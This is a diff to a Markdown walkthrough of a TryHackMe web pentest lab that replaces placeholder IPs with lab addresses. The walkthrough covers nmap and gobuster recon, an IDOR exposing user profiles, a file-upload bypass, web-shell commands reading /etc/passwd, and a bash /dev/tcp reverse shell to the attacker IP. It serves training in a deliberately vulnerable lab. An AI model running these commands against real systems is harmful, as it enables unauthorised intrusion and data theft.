@@ -6,6 +6,7 @@ A full write-up of TryHackMe's **"Guided Pentest: Web"** room, chaining four vul
 > **Target app:** RecruitX v2.4 (LAMP stack — Apache, PHP, MySQL)
 > **Duration:** ~60 min
 > **Skills:** Recon & enumeration · IDOR · Broken authentication · File upload bypass · Remote code execution
+> **Lab IPs used in this write-up:** Target `10.49.141.255` · Attacker (AttackBox) `10.49.142.90` — these are session-specific and will be different (and expired) on every new TryHackMe room instance; swap them for your own machine's IPs when reproducing.
 
 ⚠️ **Disclaimer:** This walkthrough documents an intentionally vulnerable training lab (TryHackMe). Every technique here must only be used on systems you own or are explicitly authorized to test. Do not use these steps against real/production systems.
 
@@ -46,7 +47,7 @@ Each step builds on the one before it — this is how real engagements usually w
 ### 2.1 Port scanning
 
 ```bash
-nmap -sV -sC -p- MACHINE_IP
+nmap -sV -sC -p- 10.49.141.255
 ```
 
 Results:
@@ -63,7 +64,7 @@ Four open ports. Port `3306` confirms a MySQL backend — meaning the app likely
 ### 2.2 Fingerprinting the stack
 
 ```bash
-curl -I http://MACHINE_IP
+curl -I http://10.49.141.255
 ```
 
 ```
@@ -78,7 +79,7 @@ Confirms **Apache + PHP + MySQL** — a classic LAMP stack.
 ### 2.3 Directory enumeration
 
 ```bash
-gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+gobuster dir -u http://10.49.141.255 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 ```
 
 Key findings:
@@ -100,7 +101,7 @@ Created a test account at `/register.php` and logged in at `/login.php`, landing
 ### 2.5 Exploring the API
 
 ```bash
-curl http://MACHINE_IP/api/
+curl http://10.49.141.255/api/
 ```
 
 ```json
@@ -118,7 +119,7 @@ The API helpfully lists its own endpoints — an information disclosure issue on
 Viewing your own profile shows:
 
 ```
-http://MACHINE_IP/profile.php?id=6
+http://10.49.141.255/profile.php?id=6
 ```
 
 The app references profiles by a plain numeric `id`. The obvious test: what happens if we change it?
@@ -126,7 +127,7 @@ The app references profiles by a plain numeric `id`. The obvious test: what happ
 ### 3.2 Exploiting it
 
 ```bash
-curl http://MACHINE_IP/profile.php?id=1
+curl http://10.49.141.255/profile.php?id=1
 ```
 
 Result: full profile of **Sarah Mitchell**, role `administrator`, email `s.mitchell@recruitx.thm` — with **no ownership check** performed by the server.
@@ -136,16 +137,16 @@ Result: full profile of **Sarah Mitchell**, role `administrator`, email `s.mitch
 ### 3.3 Confirming via session cookie + checking the API too
 
 ```bash
-curl -s -b "PHPSESSID=<your_session_cookie>" "http://MACHINE_IP/profile.php?id=1"
+curl -s -b "PHPSESSID=<your_session_cookie>" "http://10.49.141.255/profile.php?id=1"
 ```
 
 The `/api/user` endpoint has the **same flaw**, and doesn't even require a session cookie:
 
 ```bash
-curl -s "http://MACHINE_IP/api/user?id=1"
+curl -s "http://10.49.141.255/api/user?id=1"
 # {"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator", ...}
 
-curl -s "http://MACHINE_IP/api/user?id=2"
+curl -s "http://10.49.141.255/api/user?id=2"
 # {"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager", ...}
 ```
 
@@ -243,7 +244,7 @@ echo '<?php echo "PHP is executing"; ?>' > test.phtml
 File uploaded successfully: /uploads/documents/test.phtml
 ```
 
-Visiting `http://MACHINE_IP/uploads/documents/test.phtml` confirms the code executes:
+Visiting `http://10.49.141.255/uploads/documents/test.phtml` confirms the code executes:
 
 ```
 PHP is executing
@@ -270,10 +271,10 @@ Saved as `shell.phtml` and uploaded via the same bypass.
 ### 6.2 Executing commands
 
 ```bash
-curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=whoami"
+curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=whoami"
 # <pre>www-data</pre>
 
-curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=id"
+curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=id"
 # <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
 ```
 
@@ -282,7 +283,7 @@ Commands run as `www-data`, the default Apache user on Ubuntu.
 ### 6.3 Reading sensitive files
 
 ```bash
-curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=cat+/etc/passwd"
+curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=cat+/etc/passwd"
 ```
 
 Confirms system user enumeration is possible — in a real engagement this could lead to finding database credentials in config files.
@@ -298,7 +299,7 @@ nc -lvnp 4444
 Trigger via the web shell (URL-encoded payload to survive special characters):
 
 ```bash
-curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
+curl "http://10.49.141.255/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.49.142.90/4444+0>%261'"
 ```
 
 Back on the listener:
